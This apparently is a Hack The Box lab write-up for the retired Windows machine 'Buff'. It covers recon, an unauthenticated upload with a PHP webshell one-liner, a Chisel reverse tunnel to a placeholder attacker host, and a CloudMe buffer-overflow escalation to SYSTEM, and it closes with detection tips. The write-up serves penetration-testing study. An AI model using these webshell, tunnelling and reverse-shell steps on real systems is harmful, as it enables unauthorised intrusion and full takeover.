---
machine: Buff
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, web, file-upload, gym-management-system, cloudme, buffer-overflow, chisel]
---

# Buff — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A gym website running **Gym Management System 1.0**, vulnerable to an **unauthenticated file upload**. Upload a PHP webshell and get a shell as `shaun`. **CloudMe 1.11.2** listens on localhost with a known buffer overflow: forward the port with **Chisel** and the exploit lands as SYSTEM.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
7680/tcp  pando-pub?  (Windows Update Delivery)
8080/tcp  http        Apache 2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
```

```bash
curl -s http://<IP>:8080/ | head -50
```

The site is "mrb3n's Bro Hut", a gym page with `packages.php`, `facilities.php` and `upload.php`. The footer or HTML names the CMS: **Gym Management System 1.0**.

## Initial access

The CMS accepts uploads without a session on its upload endpoint:

```bash
curl -s -F "file=@shell.php" http://<IP>:8080/upload.php
```

```php
<?php system($_GET['c']); ?>
```

It lands at `/upload/shell.php`:

```bash
curl -s "http://<IP>:8080/upload/shell.php?c=whoami"
# buff\shaun
```

Get a reverse shell with `powershell` or `nc.exe` from the box itself, stabilise it, and read the user flag in `C:\Users\shaun\Desktop\`.

## Local enumeration

```bash
netstat -ano | findstr LISTENING
```

```text
127.0.0.1:8888   CloudMe
```

CloudMe only listens on loopback, so bring it to the attacker. With Chisel:

```bash
# attacker
./chisel server -p 8000 --reverse

# victim
.\chisel.exe client <ATTACKER_IP>:8000 R:8888:127.0.0.1:8888
```

## Escalation to SYSTEM

```bash
searchsploit CloudMe 1.11.2
```

The `CloudMe 1.11.2 - Buffer Overflow (ROP)` exploit overwrites SEH and runs `calc`/`cmd`. Swap the shellcode for a reverse shell and fire it at `127.0.0.1:8888` through the tunnel:

```bash
python3 cloudme_exploit.py
```

CloudMe runs as a service, so the shell returns as **SYSTEM** and the root flag is in `C:\Users\Administrator\Desktop\`.

## Lessons

- An old CMS with unauthenticated upload is a direct shell; PHP 7.4.6 on Windows Apache adds no protection.
- Services bound to loopback are not out of reach once you have a shell: port forwarding solves it.
- Outdated third-party software on a user desktop often runs as a service: user to SYSTEM in one step.
- Detection: POSTs to `upload.php` with executable extensions, new files in the upload directory, and `powershell` children of `httpd`.
